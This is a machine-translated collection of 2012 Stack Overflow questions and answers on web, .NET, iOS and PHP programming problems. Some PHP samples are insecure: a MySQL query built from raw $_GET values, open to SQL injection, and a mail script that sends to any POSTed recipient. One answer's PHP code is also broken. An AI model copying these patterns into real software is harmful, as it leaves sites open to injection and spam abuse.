new DatePicker('.demo_jqui', { pickerClass: 'datepicker_jqui', positionOffset:        { x: 0, y: 5 } });
new DatePicker('.demo', { positionOffset: { x: 0, y: 5 }});
});</script>

<label>Datepicker with Vista skin:</label>
<input name='date_B' type='text' value='' class='date demo_vista' />

<label>Datepicker with OSX Dashboard skin:</label>
<input name='date_B' type='text' value='' class='date demo_dashboard' />

<label>Datepicker with jQuery UI skin:</label>
<input name='date_B' type='text' value='' class='date demo_jqui' />

<label>Datepicker basic (CSS only):</label>
<input name='date_B' type='text' value='' class='date demo' /> 
```

这是该站点的确切复制/粘贴，我得到的问题是根本没有加载日期选择器。这就像它没有找到 JS 文件（在浏览器中测试过的路径，它是），任何人都可以看到问题吗？

谢谢！

# c# - 为 C# 创建 Selenium 测试用例是否需要 Visual Studio？

> ID：11917233
> 
> 赞同：0
> 
> 时间：2012-08-11T20:04:16.150
> 
> 标签：c#, selenium, selenium-webdriver

我知道您可以使用 Eclipse 和 Python 等来使用 Java ......但我的问题更多的是用 C# 编写测试脚本和测试......

如果我有用 C# 编写的用例，QA 团队如何测试用例？他们需要有一个 Visual Studio 吗？

我的另一个问题是有没有其他方法（除了 Selenium IDE）我们可以在不使用 Visual Studio 的情况下测试测试用例（用 C# 编写）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:09:30.387

您可能需要考虑使用位于 selenium 之上的框架。例如，[机器人框架](http://Robotframework.org)允许测试人员使用任何编辑器编写测试。您创建关键字，然后使用这些关键字编写测试。

# prism - 快速入门源代码 PRISM

> ID：11917234
> 
> 赞同：0
> 
> 时间：2012-08-11T20:04:32.690
> 
> 标签：prism

是否有可能找到这个：http: [//msdn.microsoft.com/en-us/library/ff921174%28v=pandp.40%29](http://msdn.microsoft.com/en-us/library/ff921174%28v=pandp.40%29) **源代码**？有关于 QuickStarts\UIComposition \UICompositionQuickstart.sln 的文章，但我真的不知道在哪里可以找到它。

感谢帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:23:06.220

它在[Prism 4.1 源代码](http://compositewpf.codeplex.com/releases/view/55576)中可用，其中还包括示例和快速入门。

# jquery - 在opencart中更改“return-reason_id”的文本

> ID：11917240
> 
> 赞同：0
> 
> 时间：2012-08-11T20:05:28.423
> 
> 标签：jquery, opencart

在我的 opencart 文件中哪里可以找到“div class="return-reason_id" 的“文本/内容”？想要更改一般的文本。请参阅链接：[http ://bionatura.noez.in/bionatura/index.php?route =帐户/退货/插入](http://bionatura.noez.in/bionatura/index.php?route=account/return/insert)

例如更改“Dean on Arrival”；找不到页面（.css？，.php.？等）来改变它！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T13:11:12.393

这可以从后端轻松完成：

> 管理员 --> 系统 --> 本地化 --> 返回

无需更改任何代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:15:06.500

您可以在`/catalog/controller/account/return.php`. 您的控制器方法是插入方法。您可以使用语言文件来更改页面上的某些文本。您的语言文件适用`/catalog/language/YOUR_LANGUAGE/account/return.php`于该页面。您可以搜索`Dean on Arrival`并更改您想要的内容。

来自 muy 语言文件的示例：`$_['entry_reason'] = 'Reason for Return:';`. 如果您从语言文件更改此行，`$this->data['entry_reason'] = $this->language->get('entry_reason');`此行会受到控制器文件的影响，并且

```
 <div class="return-reason"><span class="required">*</span> <b><?php echo $entry_reason; ?></b><br />
        <table>
          <?php foreach ($return_reasons as $return_reason) { ?>
          <?php if ($return_reason['return_reason_id'] == $return_reason_id) { ?>
          <tr>
            <td width="1"><input type="radio" name="return_reason_id" value="<?php echo $return_reason['return_reason_id']; ?>" id="return-reason-id<?php echo $return_reason['return_reason_id']; ?>" checked="checked" /></td>
            <td><label for="return-reason-id<?php echo $return_reason['return_reason_id']; ?>"><?php echo $return_reason['name']; ?></label></td>
          </tr>
          <?php } else { ?>
          <tr>
            <td width="1"><input type="radio" name="return_reason_id" value="<?php echo $return_reason['return_reason_id']; ?>" id="return-reason-id<?php echo $return_reason['return_reason_id']; ?>" /></td>
            <td><label for="return-reason-id<?php echo $return_reason['return_reason_id']; ?>"><?php echo $return_reason['name']; ?></label></td>
          </tr>
          <?php  } ?>
          <?php  } ?>
        </table>
        <?php if ($error_reason) { ?>
        <span class="error"><?php echo $error_reason; ?></span>
        <?php } ?> 
```

这些行将影响我的 .tpl 文件，您可以从控制器文件中找到您的模板文件名。

```
 if (file_exists(DIR_TEMPLATE . $this->config->get('config_template') . '/template/account/return_form.tpl')) {
        $this->template = $this->config->get('config_template') . '/template/account/return_form.tpl';
    } else {
        $this->template = 'default/template/account/return_form.tpl';
    } 
```

默认的 return.php 模板文件是`default/template/account/return_form.tpl`.

# javascript - Noty 插件导致未定义的错误

> ID：11917241
> 
> 赞同：0
> 
> 时间：2012-08-11T20:05:47.820
> 
> 标签：javascript, jquery, jquery-plugins, dialog, undefined

我正在使用一个名为 Noty( [http://needim.github.com/noty/](http://needim.github.com/noty/) ) 的对话插件。我用它来创建一个确认对话框。这是我的代码：

```
function delete_draft(id, name) {
    var text = 'Are you sure you want to delete "' + name + '"?';
    var noty = noty({
        text: text,
        buttons: [
        {addClass: 'btn btn-primary', text: 'Yes', onClick: function($noty) {
            $.post('/ajax/drafts/delete', {id:id}, function(data) {
                document.location.reload(true);
            });
            document.location.reload(true);
        }
        },
        {addClass: 'btn btn-danger', text: 'Cancel', onClick: function($noty) {
            $noty.close();
        }
        }
    ]});
} 
```

当我使用它调用它时，`delete_draft(10, "test")`它给了我：

```
TypeError: undefined is not a function
arguments: Array[1]
get message: function () { [native code] }
get stack: function () { [native code] }
set message: function () { [native code] }
set stack: function () { [native code] }
type: "called_non_callable"
__proto__: Error 
```

# facebook - 用户之间的权限

> ID：11917245
> 
> 赞同：0
> 
> 时间：2012-08-11T20:06:29.070
> 
> 标签：facebook, permissions

我正在开发一个从 Facebook 提取大量数据的应用程序，因此我正在缓存这些数据以避免发出一大堆请求。我仍然定期更新数据并使用实时更新来提高效率。但是现在，我在弄清楚用户可以访问哪些数据时遇到了一些麻烦。这是一个例子：

UserA 在 UserC 的“家庭”好友列表中
UserB 在 UserC 的“工作”好友列表中

在这种情况下，UserC 为他的家庭好友列表和他的工作好友列表设置了不同的权限。因此，UserB 无权访问 UserA 有权访问的所有数据。
现在我的问题是，如果我缓存数据，我怎么知道允许 UserB 看到哪些数据（关于 UserC）？

这是朋友列表的例子，但 Facebook 允许我们具体确定哪个人可以访问哪条数据，这使得它变得更加复杂。

在我看来，应该有一些东西可以指定两个用户并查看他们两个之间的权限，类似于 /mutualfriends 的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:53:53.567

我很确定没有机会找出用户为每个朋友列表设置的权限，因为它是一个**全局**隐私设置，因此是机密的。如果可以，您可能会在[User对象的](https://developers.facebook.com/docs/reference/api/user/)[FriendList](https://developers.facebook.com/docs/reference/api/FriendList/)连接中找到此信息，但没有此类信息。您可以查询的唯一隐私信息是与特定对象（帖子、视频、笔记、链接、照片、相册）或应用程序相关的信息。应用程序可以设置应用程序特定或对象特定的隐私设置，但不能设置全局隐私设置。因此，应用程序可以读取应用程序特定的隐私设置，但仍然无法读取全局隐私设置。

# javascript - 私有的、基于实例的、高效的函数 | 所需执行时间

> ID：11917246
> 
> 赞同：1
> 
> 时间：2012-08-11T20:06:29.817
> 
> 标签：javascript

JavaScript 语言不直接支持类或基于类的继承。

但是，JavaScript 中有许多类的实现。

我见过的所有实现都需要使用自调用函数来创建私有的、基于实例的、高效的函数。

函数具有隐私性

```
var foo = function(){ /* private to foo here */ }; 
```

但是如果你用它制作原型，你现在就有了公共的、基于实例的、高效的成员。

```
foo.prototype.func = function(){ /* private to func */ }; // foo.func in public now. 
```

如果你像这样在 foo 中放置一个函数

```
var foo = function() { 
    var funcInner = function(){}; 
}; // funcInner is now re-defined in each call to foo.  In-efficient. 
```

你得到了缺少的隐私，但现在效率低下。

因此，拥有私有的、基于实例的、高效的函数的唯一方法是使用模块模式（或类似的自调用模式）。

```
 var NS = (function(){ 
    var private = function(){ /* code */ }; // only created once b.c. in module pattern.
    var publik = {};
        publik.funcPublic = function(){ /* code */ };
    return publik;
})(); 
```

**打电话**

```
NS.funcPublic(); 
```

由此看来，要拥有私有的、基于实例的、高效的功能，需要少量的执行时间吗？

它是否正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:51:57.060

您介绍的模块模式不是一个好的解决方案。它返回一个 object `publik`，但很可能你想模拟一个类，对吧？所以我猜你打算使用`new`运算符来创建 type 的新实例`publik`。这不适用于对象，因此每当您想创建一个新实例时，您都需要调用这个匿名函数——并且您最终会为每个实例创建一个新的私有函数。（不确定这是否可以理解，请询问您是否需要澄清！）

我必须提供一个在现实中效果很好的解决方案：

```
var Car = (function() {
    // Private functions as local variables:
    var privateFunc = function(self) {};        

    // Create a local variable that will be the class (a function, to
    // enable the "new" keyword.
    var Car = function() {};

    // Attach public methods to the prototype! That's the most efficient way.
    Car.prototype.publicFunc = function() {
        privateFunc(this); // the private functions needs probably
                           // to know about the current instance
    };

    // Now return only the completed "class", to get it out into the wild
    return Car;
})();

var bmw = new Car();
bmw.publicFunc(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:02:29.577

不明白你的意思。是关于在从立即调用的函数 (iif) 创建的对象中保持私有内容吗？那么这会是你的意思吗？

```
var x = (function(){ 
    var n = 1;                                          //n = private
    var getSetN = function(val){ n+=val||0; return n; } // getSetN = private
    var public = function(){};
    public.prototype.getset = function(val){ return getSetN(val||0); };
    return public;
}());
var y = new x; z = new x;
y.getset(1);  //=> 2
y.getset(5);  //=> 7
z.getset(1);  //=> 8
y.getset();   //=> 8 
```

因此，您可以从 iif 传递的构造函数创建实例，其中使用私有变量和函数。

# emacs - 将 .ppt 或 .odf 文件转换为 org-mode 格式？

> ID：11917250
> 
> 赞同：1
> 
> 时间：2012-08-11T20:07:01.277
> 
> 标签：emacs, latex, ms-office, powerpoint, org-mode

我有许多 .ppt 文件，我想转储为 org-mode 格式（导出为 LaTeX beamer）。是否有任何（预先存在的）方法可以在任何程度上自动化这个过程？最好是对 Linux 友好的？

# c# - LINQ 按数字序列排序

> ID：11917253
> 
> 赞同：2
> 
> 时间：2012-08-11T20:07:21.470
> 
> 标签：c#, linq, list, sql-order-by

我有一个带有类别 ID 的产品列表，例如：

```
ID      CategoryID     Product Name
1       1              Product 1
2       1              Product 2
3       7              Product 3
4       8              Product 4
5       9              Product 5
6       10             Product 6 
```

我想获取此列表并按 categoryID 列表排序，例如：1、8、9 和其余部分，所以我得到：

```
ID     CategoryID     Product Name
1      1              Product 1
2      1              Product 2
4      8              Product 4
5      9              Product 5
3      7              Product 3
6      10             Product 6 
```

linq有什么办法吗？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T20:25:33.280

假设 1,8,9 在一个列表中，我们将调用`orderList`，那么虽然我们每次都可以继续在列表中查找位置，但我们会更快地创建一个字典来快速查找它。

```
var orderDict = orderList.Select((o, index) => new {ID = o, Order=index}).ToDictionary(oi => oi.ID, oi => oi.Order);
int orderHolder;
var orderedProducts = products.OrderBy(p => orderDict.TryGetValue(p.CategoryID, out orderHolder) ? orderHolder : int.MaxValue); 
```

我们不需要先设置`orderDict`，但它使逻辑比每次扫描列表更简单，而且更快：O(n + m) 而不是 O(nm)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-11T20:17:20.213

如果您的类别 ID 在列表中，您可以这样订购：

```
var list = new List<int>() { 1, 8, 9, 7, 10, ... };

var productsOrdered = from p in products
    let index = list.IndexOf(p.CategoryID)
    order by (index < 0 ? int.MaxValue : index) // in case it is not in the list
    select p; 
```

此查询仅适用于 Linq to Objects，因此您需要从数据库中无序地获取所有数据。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T20:27:27.223

如果您知道要在列表顶部排序的所有内容，请尝试以下操作：

```
var products = new List<Product>();

products.Add(new Product { ID = 1, CategoryID = 1, ProductName = "1" });
products.Add(new Product { ID = 2, CategoryID = 1, ProductName = "2" });
products.Add(new Product { ID = 3, CategoryID = 7, ProductName = "3" });
products.Add(new Product { ID = 4, CategoryID = 8, ProductName = "4" });
products.Add(new Product { ID = 5, CategoryID = 9, ProductName = "5" });
products.Add(new Product { ID = 6, CategoryID = 10, ProductName = "6" });

products
    .OrderByDescending(p => p.CategoryID == 1 || p.CategoryID == 8 || p.CategoryID == 9)
    .ThenBy(p => p.CategoryID); 
```

产生这个（来自 LinqPad）：

```
ID CategoryID ProductName 
1  1          1 
2  1          2 
4  8          4 
5  9          5 
3  7          3 
6  10         6 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-11T20:14:04.570

```
var query = from p in productsList
            orderby p.CategoryID descending
            select new {ID = p.ID, CID = p.CategoryID, PName = p.ProductName}; 
```

`query`现在包含按顺序排列的产品列表。您可以像这样枚举它：

```
foreach(Product prod in query)
   Console.WriteLine(prod.CID); 
```

编辑：误解了答案。将更新答案。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-11T20:10:23.623

您可以使用[`Enumerable.OrderBy`](http://msdn.microsoft.com/en-us/library/bb534966.aspx)：

```
var catIDs = new[] { 1, 8, 9 };
var ordered = products
    .OrderByDescending(p => catIDs.Contains(p.CategoryID))
    .ThenBy(p => p.CategoryID); 
```

编辑：这是一个演示：http: [//ideone.com/O462C](http://ideone.com/O462C)

# objective-c - MKStoreKit 没有互联网连接

> ID：11917258
> 
> 赞同：3
> 
> 时间：2012-08-11T20:07:52.963
> 
> 标签：objective-c, ios, in-app-purchase, mkstorekit

我正在使用最新的 MKStoreKit 进行应用内购买。我遇到的问题是，当应用程序启动时没有互联网时，产品不会从应用程序商店加载。如果我再跑

```
- (void) buyFeature:(NSString*) featureId
         onComplete:(void (^)(NSString* purchasedFeature, NSData*purchasedReceipt)) completionBlock         
        onCancelled:(void (^)(void)) cancelBlock; 
```

然后它永远不会运行 onComplete 或 onCancelled 因为它在找不到可购买的对象时返回这里。

```
NSArray *allIds = [self.purchasableObjects valueForKey:@"productIdentifier"];
int index = [allIds indexOfObject:productId];

if(index == NSNotFound) return; <-- IT RETURNS HERE

SKProduct *thisProduct = [self.purchasableObjects objectAtIndex:index];
    SKPayment *payment = [SKPayment paymentWithProduct:thisProduct];
    [[SKPaymentQueue defaultQueue] addPayment:payment]; 
```

它甚至不会发回错误，因此用户不会收到任何消息。

我想这应该是一个普遍的问题？我该如何以最好的方式处理它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-12T00:35:26.120

我通过评估解决了它...

```
MKStoreKit.sharedManager.pricesDictionary.count == 0 
```

...知道我是否应该告诉用户 App Store 无法购买。然后我尝试使用这种方法重新加载产品数据......

[https://github.com/MugunthKumar/MKStoreKit/issues/75](https://github.com/MugunthKumar/MKStoreKit/issues/75)

...每次用户有兴趣购买并且 App Store 根据上述不可用时。

为了在产品下载并准备好购买时更新 UI，我听取了此通知...

```
[NotificationCenter addObserver:self
                       selector:@selector(productsFetched:)
                           name:kProductFetchedNotification
                         object:nil]; 
```

# php - php电子邮件脚本发送到某种电子邮件但不发送到其他

> ID：11917259
> 
> 赞同：0
> 
> 时间：2012-08-11T20:07:57.860
> 
> 标签：php, email, actionscript, smtp

我的服务器上有一个用于发送邮件的小 php 脚本：

```
<?
$to=$_POST["to"];
$subject=$_POST["subject"];
$body=$_POST["body"];
mail($to,$subject,$body);
?> 
```

当我通过这种电子邮件时 - **myEmail@gmail.com**一切都很好，但是当我通过这种邮件时 - **mail@myWebSite.com**邮件不会发送。任何想法为什么？

编辑：我应该提到**mail@myWebSite.com**实际上是**mail@myWebSite.co.il**虽然我认为这并不重要

提前谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T07:12:06.707

这个问题涉及到相同的 php 脚本在 windows 和 linux 服务器上的行为不同的事实。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-11T20:09:57.460

尝试发送更丰富的电子邮件数据。从托管 myWebSite.com 的服务器发送！并确保 mywebsite.com 有一个邮件服务器在线收听；）

[电子邮件标题](http://www.htmlite.com/php029.php)

编辑：你能试试这个吗？

```
$to=$_POST["to"];
$subject=$_POST["subject"];
$body=$_POST["body"];
$headers   = array();
$headers[] = "MIME-Version: 1.0";
$headers[] = "Content-type: text/plain; charset=iso-8859-1";
$headers[] = "From: Sender Name <mail@yoursite.com>";
$headers[] = "Reply-To: Recipient Name <mail@yoursite.com>";
mail($to,$subject,$body, implode("\r\n", $headers)); 
```

# macos - Spotlight 和 QuickLook 集成

> ID：11917260
> 
> 赞同：0
> 
> 时间：2012-08-11T20:08:08.053
> 
> 标签：macos, spotlight, quicklook, spotlight-plugin

我编写了一个文档类型为捆绑包的应用程序。此捆绑包包含 5 个内部文件，其中一个是带有文档“本身”的 HTML。我想让我的应用 Spotlight 和 Quick Look 启用。有没有一种简单的方法可以告诉应用程序“对于 Spotlight 和 QuickLook，你假装你是包中的 HTML 文件”？还是我必须编写插件？

问候，库尔特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T01:56:40.633

您将不得不编写插件（对于快速查看，您可以尝试在包中使用特殊符号链接，但它们不适用于 HTML 文件 IIRC）。

您的 Quick Look 插件可能非常简单，因为您可以使用`QLThumbnailRequestSetThumbnailWithURLRepresentation`（告诉 Quick Look 通过呈现您的 HTML 文件来生成缩略图）和`QLPreviewRequestSetURLRepresentation`（告诉 Quick Look 使用您的 HTML 文件进行预览。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-08-19T16:53:43.280

要让 Spotlight 为您的文档编制索引，您必须编写一个 mdimporter，但它需要做的就是`/System/Library/Spotlight/RichText.mdimporter`使用为您的导入器提供的参数在您的 HTML 文件上运行。

# php - 以下拉形式列出 MySQL 数据库中的数据不起作用？

> ID：11917262
> 
> 赞同：0
> 
> 时间：2012-08-11T20:08:34.667
> 
> 标签：php, mysql, html

出于某种原因，这不起作用，即使我没有收到任何错误。下拉框保持空白。我正在尝试使用它来创建一个下拉列表，显示用户当前拥有的项目。谢谢阅读。

```
<?php
$username = $_SESSION['username'];
$id = $_GET['id'];
$action = $_GET['action'];
$result = @mysql_query("SELECT * FROM items WHERE id = '$id'");
$row = mysql_fetch_assoc($result);

echo "<center><b> $row[name] </b><br><b>Uses: $row[uses]</b></center>";

if($action = "use")
{
if($row['type'] = "food")
{
$id = $_GET['id'];
$mysqlq = @mysql_query("SELECT * FROM items WHERE owner = '$username'");
$item = mysql_fetch_array($mysqlq);

echo 
"
<form action='items.php?id=$id' name=itemform>
<select name='itemtouse'>
";
while ($item = mysql_fetch_array($mysqlq)) 
{
echo "<option value=" . $item[name] . ">" . $item[name] . "</option>";
}
echo "</select><input type=submit name=submit value=Use></input></form>";

}
else echo "This item doesn't exist.";
}
else echo "This item is not a food type.";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:22:32.057

更改`$item[name]`为`$item['name']`使用它的位置。

并删除这个不需要的（您在 while 循环中进行分配）行：

```
$item = mysql_fetch_array($mysqlq); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:44:40.477

请尝试在 mysql_query 中不使用 @。因为该表达式可能生成的任何错误消息都将被忽略。

还要使用''中的所有变量。$row[name] 作为 $row['name']。

**编辑**

你用过这条线`$item = mysql_fetch_array($mysqlq);`。这将失去结果。

# extjs - 如何在 vbox 布局中启用 ExtJS 4.1.1 TreePanel 中的滚动？

> ID：11917266
> 
> 赞同：0
> 
> 时间：2012-08-11T20:09:06.837
> 
> 标签：extjs, extjs4.1

这是一个小提琴：http: [//jsfiddle.net/bimargulies/yHuz2/](http://jsfiddle.net/bimargulies/yHuz2/)

这个小提琴在具有 vbox 布局的面板内的垂直列中有两个树面板。

添加 autoScroll: true 或我尝试过的任何其他方法都无法在树面板内启用滚动。滚动包含左侧面板的整体作品。

查看 CSS，似乎问题在于 ExtJS 中没有为面板指定特定高度，因此溢出样式没有效果。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-12T12:20:54.560

在定义 vbox 布局时，每个子项必须有`flex`或`height`配置，因此布局可以计算这些的高度。您的代码缺少这些，添加它们将启用滚动。

此外，在您的情况下，您的布局定义应该是：

```
layout: {
    type: 'vbox',
    align: 'stretch'
}, 
```

为了告诉布局在可用空间中拉伸树节点（默认对齐：`left`不会正确设置节点的右边距），这将在预期的位置显示滚动条。

这是按预期工作[的 JsFiddle 的修改版本](http://jsfiddle.net/Izhaki/yHuz2/36/)。

# c# - 如何使用 MEF 实现这个视图模型工厂？

> ID：11917268
> 
> 赞同：0
> 
> 时间：2012-08-11T20:09:21.183
> 
> 标签：c#, mvvm, export, mef, composition

我从名为 MVVM RI 的 PRISM 示例中复制了一个代码，在这个工厂中有一个`Dictionary<Type, Func<Question, QuestionViewModel>>`用于映射的代码。这里是：

```
 /// <summary>
    /// Factory class to create a question view model for a given question object.
    /// </summary>
    private static class QuestionViewModelFactory
    {
        private static Dictionary<Type, Func<Question, QuestionViewModel>> maps = new Dictionary<Type, Func<Question, QuestionViewModel>>()
        {
            { typeof(OpenQuestion), (q) => new OpenQuestionViewModel((OpenQuestion)q) },
            { typeof(MultipleSelectionQuestion), (q) => new MultipleSelectionQuestionViewModel((MultipleSelectionQuestion)q) },
            { typeof(NumericQuestion), (q) => new NumericQuestionViewModel((NumericQuestion)q) }
        };

        public static QuestionViewModel GetViewModelForQuestion(Question question)
        {
            Func<Question, QuestionViewModel> viewModelInstanceFactory = null;
            if (maps.TryGetValue(question.GetType(), out viewModelInstanceFactory))
            {
                return viewModelInstanceFactory(question);
            }
            else
            {
                throw new ArgumentOutOfRangeException("Could not locate a view model for question type");
            }
        }
    } 
```

请注意，每个派生类都`QuestionViewModel`需要创建一个构造函数参数。

```
public abstract class QuestionViewModel : NotificationObject
{
    protected QuestionViewModel() { ... }
}

public abstract class QuestionViewModel<T> : QuestionViewModel
    where T : Question
{
    protected QuestionViewModel(T question) { ... }
} 
```

但是现在，我需要通过发现来拥有这个工厂（因为我没有参考，这些在不同的模块中）。我在想像在开始时创建一个新的自定义属性，但后来我说：我怎样才能将参数传递给构造函数？

我将创建数百个相同数据类型的问题，这就是为什么`[Import]`行不通的原因（我猜）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T22:13:20.117

你可以考虑使用`ExportFactory<T>`. 这包含在 Silverlight 中，对于 WPF，您可以从[Glenn Block 的 Skydrive](http://mef.codeplex.com/discussions/207539)下载 Silverlight 代码的端口。

使用 an`ExportFactory`您可以为给定的导入类型创建任意数量的对象。

```
[ImportMany]
public IEnumerable<ExportFactory<IModule, IModuleMetadata>> Modules { get; set; } 
```

然后你可以调用 的`CreateExport()`方法`ExportFactory`来导出一个新的对象。我最近了解了如何使用`ExportFactory`，所以[这篇文章](https://stackoverflow.com/q/12359887/918431)可能会帮助您入门。

# python - 用lxml python解析xhtml

> ID：11917270
> 
> 赞同：5
> 
> 时间：2012-08-11T20:09:39.223
> 
> 标签：python, lxml, parsexml

小问题，真的卡在这里了，不明白怎么回事，就是想从网上解析一个普通的xhtml，没什么特别的……

这是错误：

```
 File "class/page.py", line 85, in xslParse
    doc = lxml.etree.fromstring(self.content)
    File "lxml.etree.pyx", line 2753, in lxml.etree.fromstring (src/lxml/lxml.etree.c:54647)
    File "parser.pxi", line 1578, in lxml.etree._parseMemoryDocument (src/lxml/lxml.etree.c:82764)
    File "parser.pxi", line 1457, in lxml.etree._parseDoc (src/lxml/lxml.etree.c:81562)
    File "parser.pxi", line 965, in lxml.etree._BaseParser._parseDoc (src/lxml/lxml.etree.c:78232)
    File "parser.pxi", line 569, in lxml.etree._ParserContext._handleParseResultDoc (src/lxml/lxml.etree.c:74488)
    File "parser.pxi", line 650, in lxml.etree._handleParseResult (src/lxml/lxml.etree.c:75379)
    File "parser.pxi", line 590, in lxml.etree._raiseParseError (src/lxml/lxml.etree.c:74712)
    XMLSyntaxError: StartTag: invalid element name, line 1, column 2 
```

self.content 是一个由 http 响应给出的普通字符串，没有清理，没有替换，什么都没有，只是服务器的响应，那么有什么意思呢？

html的开头是：

```
<!doctype html>
<!-- paulirish.com/2008/conditional-stylesheets-vs-css-hacks-answer-neither/ -->
<!--[if lt IE 7 ]> <html lang="fr" class="no-js ie6" itemscope itemtype="http://schema.org/Product"> <![endif]-->
<!--[if IE 7 ]>    <html lang="fr" class="no-js ie7" itemscope itemtype="http://schema.org/Product"> <![endif]-->
<!--[if IE 8 ]>    <html lang="fr" class="no-js ie8" itemscope itemtype="http://schema.org/Product"> <![endif]-->
<!--[if IE 9 ]>    <html lang="fr" class="no-js ie9" itemscope itemtype="http://schema.org/Product"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js" itemscope itemtype="http://schema.org/Product"> <!--<![endif]-->
<head>...... 
```

一个普通的网页，为什么 lxml 不能解析一个普通的格式良好的文档？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-11T22:25:16.503

`<!doctype html>`表示它是一个使用 HTML 语法的 HTML5 文档。因此，您应该使用 HTML（而不是 XML）解析器。为了比较，XML 文档可能以`<?xml version="1.0" encoding="UTF-8"?>`.

您可以使用评论中建议`lxml.html.fromstring()`的[@unutbu](https://stackoverflow.com/questions/11917270/parsing-xhtml-with-lxml-python#comment15867997_11917270)。

如果您通过 HTTP 接收页面，则使用 XML 语法的 HTML5 文档应该具有 XML 媒体类型，例如`application/xhtml+xml`或`application/xml`代替`text/html`HTML 语法。

# php - 在用于搜索引擎优化 (SEO) 的 URL 中包含博客文章标题？

> ID：11917272
> 
> 赞同：1
> 
> 时间：2012-08-11T20:09:56.977
> 
> 标签：php, mysql, database, dynamic, seo

我先描述一下我的情况：

我有一个博客网站，博客条目存储在 MySQL 数据库中，然后在用户访问该网站时加载。每个博客文章都有可用于搜索博客文章的标签。我希望用户在使用 Google 等搜索引擎搜索帖子标签或标题中的相关字词时，能够将我的个人博客帖子作为结果。

例如，如果我有一个标题为“在 URL 中包含博客文章标题以进行搜索引擎优化？”的帖子，并且用户搜索“url seo 中的博客文章标题”之类的内容，那么我希望我的帖子应该显示作为结果之一（例如，当您在 Google 上搜索编程问题时，很多结果都来自 Stackoverflow）。

我猜我必须实现一个系统，在其中创建一个名为 post.php 的动态 php 页面，在该页面中，该页面用于显示单个博客文章，其标题包含在 url 中。此外，将帖子标签作为此页面的元关键字包含在内会很好。但我不想在我的服务器上拥有每个博客文章的静态页面，这样我就可以在 url 中包含标题。如果您查看 stackoverflow 的操作方式，他们会有单独的帖子链接到 url，其中帖子的标题包含在 url 本身中。我想要类似的东西。所以我最后改写的问题是：

1)**在 URL 中包含帖子标题对 SEO 有好处吗？**

2)**使用从 MySQL 加载博客文章数据的动态页面是否对 SEO 不利，因为数据实际上并没有出现在网站上？**

3）**如何创建一个动态页面，用于在单击单个博客文章时显示它们并且在 URL 中有博客文章标题（类似于 Stackoverflow 所做的）？**奖励：如果它可以将帖子标签作为元关键字，那就太棒了！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:15:50.607

使用**robots.txt**链接到**站点地图**，您可以在其中列出所有网址。谷歌会找到它。

此外，但不是至关重要的：使用**.htaccess**神奇地将 php-url-crap 转换为 domain.ext/category/post-id.html 或任何其他**SEO 友好的 URL**。

更新：嗯，我一般不信任 XML。我所有的站点地图都是 php 生成的 html 文件，它们工作得很好。

1.  URL结构对SEO很重要。
2.  那没关系。看看 Wordpress、Joomla、Drupal……同样的原理。
3.  您有一些 page.php 文件，在交付 html 之前，执行**SQL 查询**并仅选择该 URL 的数据，然后将其插入到 html 中，每个用户输入不同的 url，将看到不同的内容。

我建议您花一些时间观看或阅读有关“PHP MYSQL 初学者 CMS”主题的教程

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:38:05.253

我会使用这样的东西：

```
<!DOCTYPE HTML>
<!--
<?php
if(!isset($_GET['id']) && empty(trim($_GET['id']))) die('No post number specified!');
$conn = mysqli_connect('localhost', 'username', 'password', 'blog_db') or die('MySQL connection failed!');
$id = mysqli_real_escape_string($conn, preg_replace('/[^0-9]/', '', $_GET['id'])
$query = "SELECT * FROM `posts` WHERE `id` = '$id'";
$result = mysqli_query($conn, $query) or die('MySQL query failed!');
$post = mysqli_fetch_assoc($result) or die('Fetching content failed!');
$title = $post['title'];
$content = $post['content'];
$tags = explode(',', $post['tags']);
$author = $post['author'];
$time = $post['time'];
?>
-->
<html lang="en-US">
<head>
    <meta charset="UTF-8" />
    <title><?php echo htmlentities($title); ?> &mdash; By Blog</title>
    <meta name="keywords" content="<?php echo implode(',', htmlentities($tags)); ?>" />
</head>
<body>
    <div id="post">
        <div id="post-content">
<?php echo htmlentities($post); ?>
        </div>
        <div id="post-tags">
            <ul id="tags">
<?php foreach($tags as $tag) { ?>
                <li>
                    <a href="/tagged/<?php echo urlencode($tag); ?>"><?php echo htmlentities($tag) ?></a>
                </li>
<?php } ?>
            </ul>
        </div>
        <div id="author">posted by <a href="/author/<?php echo urlencode($author); ?>"><?php echo htmlentities($author); ?></a></div>
    </div>
</body>
</html> 
```

您可能希望研究 URL 重写（查看此 URL：标题可见，但实际文件不存在），这将使其对搜索引擎更加友好。

此外，为访问者提供站点地图也很好，因为搜索引擎也会跟踪那里的链接。

# xcode - Xode4 如何将经纬度数据从 flickr 传递到 mapview xib 文件

> ID：11917274
> 
> 赞同：0
> 
> 时间：2012-08-11T20:10:26.367
> 
> 标签：xcode, xcode4, mkmapview

对这里的 xcode 来说很新。我能够获取 flickr 数据，然后在单击较小的图像时显示较大的图像。

